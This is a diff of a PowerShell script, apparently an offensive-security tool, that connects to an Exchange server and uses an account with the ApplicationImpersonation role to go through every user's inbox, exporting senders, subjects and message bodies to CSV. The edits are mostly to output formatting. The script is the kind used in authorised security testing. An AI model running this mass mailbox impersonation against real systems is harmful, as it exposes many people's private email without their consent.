@@ -207,7 +207,7 @@ $TASource=@'
   #PowerShell Remoting to Remote Exchange Server, Import Exchange Management Shell Tools
   try
   {
-    $Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri $ExchUri -Authentication Kerberos -Credential $Login -ErrorAction Stop -verbose:$false 
+    $Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri $ExchUri -Authentication Kerberos -Credential $Login -ErrorAction Stop -verbose:$false
   }
   catch
   {
@@ -230,7 +230,7 @@ $TASource=@'
   
   try
   {
-    Import-PSSession $Session -DisableNameChecking -verbose:$false | Out-Null
+    Import-PSSession $Session -DisableNameChecking -AllowClobber -verbose:$false | Out-Null
   }
   catch
   {
@@ -245,8 +245,8 @@ $TASource=@'
   #Get a list of all mailboxes
   if($EmailList -ne "")
   {
-    Write-Output $EmailList
     $AllMailboxes = Get-Content -Path $EmailList
+    Write-Host "[*] The total number of mailboxes discovered is: " $AllMailboxes.count
   }
   else 
   {
@@ -254,6 +254,7 @@ $TASource=@'
     $AllMailboxes = $SMTPAddresses -replace ".*:"
     Write-Host "[*] The total number of mailboxes discovered is: " $AllMailboxes.count
   }
+  
   #Set the Exchange Web Services URL 
   if ($ExchHostname -ne "")
   {
@@ -264,13 +265,15 @@ $TASource=@'
   {
     ("[*] Using EWS URL " + "https://"  + $service.Url.Host + "/EWS/Exchange.asmx")
     $service.AutoDiscoverUrl($AutoDiscoverEmail, {$true})
-  }    
-
+  }   
+ 
+  Write-Host -foregroundcolor "yellow" "`r`n[*] Now connecting to EWS to search the mailboxes!`r`n"
+ 
   #Search function searches through each mailbox one at a time
   ForEach($Mailbox in $AllMailboxes)
   {
     $i++
-        Write-Output ("[" + $i + "/" + $AllMailboxes.count + "] Using " + $ImpersonationAccount + " to impersonate " + $Mailbox)
+        Write-Host -NoNewLine ("[" + $i + "/" + $AllMailboxes.count + "]") -foregroundcolor "yellow"; Write-Output (" Using " + $ImpersonationAccount + " to impersonate " + $Mailbox)
 
     $service.ImpersonatedUserId = New-Object Microsoft.Exchange.WebServices.Data.ImpersonatedUserId([Microsoft.Exchange.WebServices.Data.ConnectingIdType]::SmtpAddress,$Mailbox ); 
     $rootfolder = [Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox
@@ -308,7 +311,7 @@ $TASource=@'
       $mails = $Inbox.FindItems($MailsPerUser)
     }
     catch [Exception]{
-      Write-Output ("[*] Warning: " + $Mailbox + " does not appear to have a mailbox.")
+      Write-Host -foregroundcolor "red" ("[*] Warning: " + $Mailbox + " does not appear to have a mailbox.")
       continue
     }
     $PostSearchList = @()
@@ -335,7 +338,7 @@ $TASource=@'
       $PostSearchList | Select-Object Sender,ReceivedBy,Subject,Body | Export-Csv "temp-$OutputCsv"
         if ("temp-$OutputCsv")
         {
-          [System.IO.File]::ReadAllText("temp-$OutputCsv") | Out-File $OutputCsv -Append 
+          Import-Csv "temp-$OutputCsv" | ConvertTo-Csv -NoTypeInformation | Out-File -Encoding ascii -Append $OutputCsv
           Remove-Item "temp-$OutputCsv"
         }
     }
@@ -344,8 +347,13 @@ $TASource=@'
       $PostSearchList | ft -Property Sender,ReceivedBy,Subject,Body | Out-String
     }
   }
+  
+  if ($OutputCsv -ne "")
+  {
+    Write-Host -foregroundcolor "yellow" "`r`n[*] Results have been output to $OutputCsv"
+  }
   #Remove User from impersonation role
-  Write-Output "Removing ApplicationImpersonation role from $ImpersonationAccount."
+  Write-Output "`r`n[*] Removing ApplicationImpersonation role from $ImpersonationAccount."
   Get-ManagementRoleAssignment -RoleAssignee $ImpersonationAccount -Role ApplicationImpersonation -RoleAssigneeType user | Remove-ManagementRoleAssignment -confirm:$fals
 
   #Removing EWS DLL
